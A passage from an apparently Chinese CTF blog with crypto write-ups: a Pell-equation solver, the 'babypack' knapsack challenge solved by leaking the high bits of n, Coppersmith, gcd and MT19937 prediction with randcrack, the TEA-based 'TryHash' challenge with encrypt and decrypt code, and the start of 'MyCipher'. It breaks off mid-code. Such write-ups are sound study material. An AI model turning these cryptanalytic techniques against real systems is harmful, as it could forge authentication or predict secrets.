class="number">2</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                ans[i][j] += x[i][k] * y[k][j]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quickMatrix</span>(<span class="params">m,n</span>):</span><br><span class="line">    E = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]        <span class="comment">#先定义一个单位矩阵</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        E[i][i] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(n):</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            E = mulMatrix(E,m)</span><br><span class="line">        m = mulMatrix(m,m)</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> E</span><br><span class="line"></span><br><span class="line">d=<span class="number">9838</span>*<span class="number">4</span></span><br><span class="line">x1,y1=find_mini_solution(d)</span><br><span class="line"><span class="built_in">print</span>((x1,y1))</span><br><span class="line">basis_matrix=[[x1,d*y1],[y1,x1]]</span><br><span class="line"></span><br><span class="line">cnt=<span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tmp=quickMatrix(basis_matrix,cnt)</span><br><span class="line">    xn=tmp[<span class="number">0</span>][<span class="number">0</span>]*x1+tmp[<span class="number">0</span>][<span class="number">1</span>]*y1</span><br><span class="line">    yn=tmp[<span class="number">1</span>][<span class="number">0</span>]*x1+tmp[<span class="number">1</span>][<span class="number">1</span>]*y1</span><br><span class="line">    <span class="keyword">if</span> xn &gt;<span class="number">2</span> ** <span class="number">0x1337</span> <span class="keyword">and</span> yn &gt; <span class="number">2</span> ** <span class="number">0x1337</span> <span class="keyword">and</span> xn**<span class="number">2</span>-d*yn**<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(cnt)</span><br><span class="line">        <span class="built_in">print</span>((xn-<span class="number">1</span>)//<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(yn)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>感觉用sage会方便很多0.0</p>
<p>sage果然方便，连分数有内置的函数，补上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def solve_pell(N, numTry = 100):</span><br><span class="line">	cf= continued_fraction(sqrt(N))</span><br><span class="line">	for i in range(numTry):</span><br><span class="line">		denom = cf.denominator(i)</span><br><span class="line">		numer = cf.numerator(i)</span><br><span class="line">		if numer^2-N*denom^2 == 1:</span><br><span class="line">			return numer,denom</span><br><span class="line">print(solve_pell(9838)) </span><br><span class="line">#(2662019309411216232806345449321879270495478346383, 26838472360889124413883226557207387537524821524)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Continued Fractions</tag>
        <tag>Pell Equation</tag>
      </tags>
  </entry>
  <entry>
    <title>天翼杯</title>
    <url>/2021/09/27/2021/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
    <content><![CDATA[<p>赛后问了别的师傅复盘一下，好的东西需要记录</p>
<span id="more"></span>
<h1 id="babypack">babypack</h1>
<p>这一题真牛啊，考了很多考点，而且没有很偏的，很考验能力。nalrw👴想出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">512</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == b:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = egcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder</span>(<span class="params">pairs</span>):</span><br><span class="line">    mod_list, remainder_list = [p[<span class="number">0</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs], [p[<span class="number">1</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs]</span><br><span class="line">    mod_product = reduce(<span class="keyword">lambda</span> x, y: x * y, mod_list)</span><br><span class="line">    mi_list = [mod_product//x <span class="keyword">for</span> x <span class="keyword">in</span> mod_list]</span><br><span class="line">    mi_inverse = [egcd(mi_list[i], mod_list[i])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mi_list))]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(remainder_list)):</span><br><span class="line">        x += mi_list[i] * mi_inverse[i] * remainder_list[i]</span><br><span class="line">        x %= mod_product</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    U = [getrandbits(N)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">    V = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        v = U[i] - <span class="built_in">pow</span>(<span class="number">2</span>, N-i-<span class="number">1</span>)</span><br><span class="line">        V.append(v)</span><br><span class="line"></span><br><span class="line">    s1 = <span class="built_in">sum</span>(U)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(s1.bit_length() + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> p &gt; s1:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s1 = <span class="number">0</span></span><br><span class="line">    s2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> V:</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">0</span>:</span><br><span class="line">            s2 += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s1 += i</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">max</span>(s1, -s2)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(tmp.bit_length() + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> q &gt; tmp:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    A = []</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(U, V):</span><br><span class="line">        A.append(chinese_remainder([(p, i), (q, j)]))</span><br><span class="line">    <span class="keyword">return</span> A, U, V, p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m, n</span>):<span class="comment">#比较高位</span></span><br><span class="line">    mbin = <span class="built_in">bin</span>(m)[<span class="number">2</span>:]</span><br><span class="line">    nbin = <span class="built_in">bin</span>(n)[<span class="number">2</span>:]</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(mbin, nbin):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, pub</span>):<span class="comment">#背包加密</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(msg, pub):</span><br><span class="line">        s += i * j</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A, U, V, p, q = keygen()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;your pubkey:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(U[<span class="number">0</span>] + V[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(U[<span class="number">0</span>] * V[<span class="number">0</span>])</span><br><span class="line">Menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.hint</span></span><br><span class="line"><span class="string">2.get flag&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="built_in">print</span>(Menu)</span><br><span class="line">    op = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>).strip())</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        m = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>).strip())</span><br><span class="line">        <span class="built_in">print</span>(check(m, n))</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">        msg = [randint(<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">        ct = encrypt(msg, A)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;secret:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(ct)</span><br><span class="line">        secret = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>).strip())</span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, msg))), <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> ans == secret:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="分析代码">分析代码</h2>
<ul>
<li>首先使用getrandbits函数生成512个512比特的列表U，再生成列表V，有<span class="math display">\[ V_i=U_i-2^{511-i}\]</span></li>
<li>然后生成p,q，两个大概都是520位上下</li>
<li>使用CRT生成A，满足</li>
</ul>
<p><span class="math display">\[
A_i=U_i\;mod\;p\\
A_i=V_i\;mod\;q
\]</span></p>
<ul>
<li>最后用randint(0,
1)生成01背包msg与A合成得到ct，最后我们要传入的结果就是仅含0和1的msg</li>
</ul>
<p>这一题我们有的能拿到的数据有:<span class="math display">\[A,U_0+V_0,U_0*V_0,ct\]</span></p>
<p>我们在这一题能与oracle进行一个交互，传入一个数x，oracle将比较x和n二进制的较高位，并返回位相等的个数。</p>
<h2 id="思路">思路</h2>
<p>首先看到01背包很难不想到造格子，但是实际操作后发现512阶的矩阵连造都造不出来。并且，再仔细想，就算分解n拿到pq，接着拿到UV，对求解01的msg没有任何帮助，所以放弃造格子这一套。</p>
<p>观察到msg是用512次randint(0,
1)生成的，再加上前面生成U时用的是getrandbits，这两个函数的算法逻辑都是MT19937，这种伪随机数生成是可以破解的，只需要624个32比特的数。又由A和UV存在同余关系，如果拿到pq就能拿到UV，所以接下来要思考如何factor。</p>
<p>本题给出了<span class="math display">\[A,U_0+V_0,U_0*V_0\]</span>，我们很容易能够拿到单独的<span class="math display">\[U_0、V_0\]</span></p>
<p>由UV和A的关系h我们可以知道： <span class="math display">\[
p|A_0-U_0\\
q|A_0-v_0\\
∴n=pq|(A_0-U_0)(A_0-v_0)
\]</span>
观察到，右边是已知条件，n待求，我们可以获取n的高多少多少位！</p>
<p>因此可以转换到Coppersmith Method已知p高位的情况！！</p>
<p>但是，由于我们最多只能和Oracle交互500次，由生成可知n大概为1040位，如果每次只爆一位，我们最多只能获得500位，这个条件是不足以使用coppersmith的。</p>
<p>这里就很考验智商了，我只能说nalrw
yyds，我们可以采取一次爆破两位的方法，那么3次内就一定能爆破出两位，所以相当于0.75次爆破一位，那么前499次交互就能获取n的前499*3/2位，这足够用来求解了。这里需要知道n一共有多少位（因为要知道n缺失了多少低位），所以还是需要测试才知道n的位数范围，算是个小细节</p>
<p>之后使用gcd就能够分解出p和q，接下来就能求得U和V，然后使用调包randcrack破解MT19937。这里也有个小细节，由于randcrack只能预测连续的伪随机数，所以得取U最后624个32位数据，也比较麻烦。</p>
<p>代码可以参考春哥写的：<a href="https://zhuanlan.zhihu.com/p/413319231">春乎</a></p>
<h2 id="总结">总结</h2>
<p>回顾一下整个流程：n高位——copper——gcd——randcrack，算是比较综合的一道题了，但是每一个单独的板块都是常规题（怎么有种做高考题的感觉，比较有意思</p>
<h1 id="tryhash">TryHash</h1>
<p>加密部分myHash是Tea加密，逆向中经常出到的。队里的师傅也写过<a href="https://taardisaa.github.io/2021/09/24/TEA/#more">TEA，XTEA，XXTEA加密算法概要
| Tardis's blog (taardisaa.github.io)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> signal,os,random,string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32 <span class="keyword">as</span> uint32</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(SocketServer.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof).hexdigest()</span><br><span class="line">        self.request.send(<span class="string">&quot;sha256(XXXX+%s) == %s\n&quot;</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">        self.request.send(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>)</span><br><span class="line">        x = x.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dorecv</span>(<span class="params">self,sz</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.request.recv(sz).strip()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dosend</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">myhash</span>(<span class="params">self,msg,identification</span>):</span><br><span class="line">        delta=<span class="number">0x9E3779B9</span></span><br><span class="line">        v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, msg))</span><br><span class="line">        k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, identification))</span><br><span class="line">        sm, delta = uint32(<span class="number">0</span>), uint32(delta)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            sm.value += delta.value</span><br><span class="line">            v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + sm.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">            v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + sm.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.alarm(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        nounce = os.urandom(<span class="number">8</span>)</span><br><span class="line">        self.dosend(<span class="string">&quot;Welcome to the Auth System.&quot;</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;If you are admin, I will give you the flag.\n&#x27;</span>)   </span><br><span class="line">        adminpass = <span class="string">&#x27;Iamthesuperadmin&#x27;</span></span><br><span class="line">        adminhash = self.myhash(nounce,adminpass)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            self.dosend(<span class="string">&#x27;Choice:\n&#x27;</span>)</span><br><span class="line">            choice = <span class="built_in">int</span>(self.dorecv(<span class="number">8</span>))</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">0</span>:</span><br><span class="line">                self.dosend(<span class="string">&#x27;I can hash for you&#x27;</span>)</span><br><span class="line">                user = self.dorecv(<span class="number">32</span>)   </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(user)!=<span class="number">16</span>:</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">if</span> user == adminpass:</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                userhash = self.myhash(nounce,user)</span><br><span class="line">                self.dosend(userhash+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">1</span>:</span><br><span class="line">                self.dosend(<span class="string">&#x27;Are you admin?&#x27;</span>)</span><br><span class="line">                userhash = self.dorecv(<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">if</span> userhash == adminhash:</span><br><span class="line">                    self.dosend(flag+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.dosend(<span class="string">&#x27;You are not admin!\n&#x27;</span>)</span><br><span class="line">                    self.request.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span>       </span><br><span class="line">        </span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkingServer</span>(SocketServer.ForkingTCPServer, SocketServer.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10005</span></span><br><span class="line">    server = ForkingServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们可以先用我们给定的密钥加密，然后拿到密文，再通过密文解出nounce，然后再用已知密钥加密拿到userhash，就出了。</p>
<p>第一次见到Tea加密算法，加解密函数如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    summ = c_uint32(<span class="number">0</span>)</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line"></span><br><span class="line">    k0, k1, k2, k3 = c_uint32(k[<span class="number">0</span>]), c_uint32(k[<span class="number">1</span>]), c_uint32(k[<span class="number">2</span>]), c_uint32(k[<span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x&quot;</span> % (v0.value, v1.value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x %#x %#x&quot;</span> % (k0.value, k1.value, k2.value, k3.value))</span><br><span class="line"></span><br><span class="line">    w = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        summ.value += delta</span><br><span class="line">        v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + summ.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + summ.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line">    w[<span class="number">0</span>], w[<span class="number">1</span>] = v0, v1</span><br><span class="line">    <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    summ = c_uint32(<span class="number">0xC6EF3720</span>)</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line"></span><br><span class="line">    k0, k1, k2, k3 = c_uint32(k[<span class="number">0</span>]), c_uint32(k[<span class="number">1</span>]), c_uint32(k[<span class="number">2</span>]), c_uint32(k[<span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x&quot;</span> % (v0.value, v1.value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x %#x %#x&quot;</span> % (k0.value, k1.value, k2.value, k3.value))</span><br><span class="line"></span><br><span class="line">    w = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + summ.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + summ.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        summ.value -= delta</span><br><span class="line">    w[<span class="number">0</span>], w[<span class="number">1</span>] = v0, v1</span><br><span class="line">    <span class="keyword">return</span> w</span><br></pre></td></tr></table></figure>
<h1 id="mycipher">MyCipher</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> signal,os,random,string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(SocketServer.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof).hexdigest()</span><br><span class="line">        self.request.send(<span class="string">&quot;sha256(XXXX+%s) == %s\n&quot;</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">        self.request.send(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>)</span><br><span class="line">        x = x.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dorecv</span>(<span class="params">self,sz</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.request.recv(sz).strip()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dosend</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">self,v1,v2,x</span>):</span><br><span class="line">        value = (v1+v2+x)%<span class="number">256</span></span><br><span class="line">        value = ((value&lt;&lt;<span class="number">3</span>) | (value&gt;&gt;<span class="number">5</span>)) &amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">self,value</span>):</span><br><span class="line">        v1,v2 = unpack(<span class="string">&#x27;&gt;2B&#x27;</span>,pack(<span class="string">&#x27;&gt;H&#x27;</span>,value))</span><br><span class="line">        v2 = self.g(v1,v2,<span class="number">1</span>)</span><br><span class="line">        v1 = self.g(v1,v2,<span class="number">0</span>)</span><br><span class="line">        value = unpack(<span class="string">&#x27;&gt;H&#x27;</span>,pack(<span class="string">&#x27;&gt;2B&#x27;</span>,v1,v2))</span><br><span class="line">        <span class="keyword">return</span> value[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_ecb</span>(<span class="params">self,msg,key</span>):</span><br><span class="line">        l = <span class="built_in">len</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> l%<span class="number">4</span> !=<span class="number">0</span>:</span><br><span class="line">            msg = msg+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">4</span>-(l%<span class="number">4</span>))</span><br><span class="line">        cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(msg),<span class="number">4</span>):</span><br><span class="line">            cipher += self.encrypt(msg[i:i+<span class="number">4</span>],key)</span><br><span class="line">        <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,msg,key</span>):</span><br><span class="line">        subkeys = unpack(<span class="string">&#x27;&gt;4H&#x27;</span>,key)</span><br><span class="line">        left,right = unpack(<span class="string">&#x27;&gt;2H&#x27;</span>,msg)</span><br><span class="line">        right = right^subkeys[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            tmp = left^self.f(subkeys[i]^right) </span><br><span class="line">            left = right</span><br><span class="line">            right = tmp</span><br><span class="line">        left = right^left</span><br><span class="line">        <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2H&#x27;</span>, left, 